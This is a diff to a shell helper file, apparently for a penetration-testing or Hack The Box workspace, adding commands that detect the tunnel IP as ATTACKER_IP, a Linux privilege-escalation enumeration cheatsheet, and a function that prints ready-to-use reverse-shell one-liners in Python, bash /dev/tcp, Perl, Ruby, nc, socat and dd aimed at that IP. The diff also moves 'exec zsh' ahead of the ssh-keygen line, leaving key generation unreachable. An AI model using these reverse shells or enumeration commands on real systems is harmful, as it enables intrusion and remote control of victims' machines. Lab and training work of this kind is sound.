@@ -6,15 +6,20 @@ my_resources_path='/opt/my-resources'
 
 # custom /workspace/ directory
 ws.gen () {
+
+    # get the tun0 IP if the interface exists (shortcut for htb)
+    ATTACKER_IP=$(ip -4 addr show tun0 | grep -oP '(?<=inet )[^/]+')
+    echo "export ATTACKER_IP=$ATTACKER_IP" >> $ex_profile_path
+
     if [ -z "$ATTACKER_PASSPHRASE" ]; then
         echo "ATTACKER_PASSPHRASE is not set"
         read -s "?Enter the passphrase: " ATTACKER_PASSPHRASE
         echo "export ATTACKER_PASSPHRASE='$ATTACKER_PASSPHRASE'" >> $ex_profile_path
-        exec zsh
     fi
 
-    mkdir -p $ws_path/{implants,scripts,tools,miscs,sources,differences,reports}
+    mkdir -p $ws_path/{implants,scripts,tools,miscs,sources,differences,reports,dumps}
     touch $ws_path/doc.md
+    exec zsh
     ssh-keygen -t rsa -b 4096 -f $ws_path/implants/implant.key -N $ATTACKER_PASSPHRASE -q
 }
 
@@ -52,6 +57,39 @@ wget.random.light () { wget --recursive --no-parent --convert-links --page-requi
 # base64
 b.decode () { echo $1 | base64 -d }
 b.encode () { echo $1 | base64 } 
+
+# cheatsheet
+
+cs.enum.linux () {
+  # get caps
+  echo 'getcap -r / 2>/dev/null;'
+
+  # search setuid et guid
+  echo 'find / -perm -u=s -type f 2>/dev/null;'
+  echo 'find / -perm -g=s -type f 2>/dev/null;'
+
+  # get all users and groups
+  echo 'echo "users\n"; cat /etc/passwd | cut -d: -f1; echo "groups\n"; cat /etc/group | cut -d: -f1;'
+}
+
+cs.rs.linux () {
+  local ip=$ATTACKER_IP
+  local port=9999
+  # reverse shell with python oneliner 
+  echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+  # reversr shell with bash oneliner
+  echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
+  # reverse shell with perl oneliner
+  echo "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+  # reverse shell with ruby oneliner
+  echo "ruby -rsocket -e'f=TCPSocket.new(\"$ip\",$port);exec(\"/bin/sh -i\")'"
+  # reverse shell with nc oneliner
+  echo "nc -e /bin/sh $ip $port"
+  # reverse shell with socat oneliner
+  echo "socat TCP:$ip:$port EXEC:/bin/sh"
+  # reverse shell with dd oneliner
+  echo "dd if=/dev/tcp/$ip/$port 0>&1 | /bin/sh | dd of=/dev/null"
+}
 
 # shortcut Documentations
 doc.gtfobin () { echo 'https://gtfobins.github.io/' }
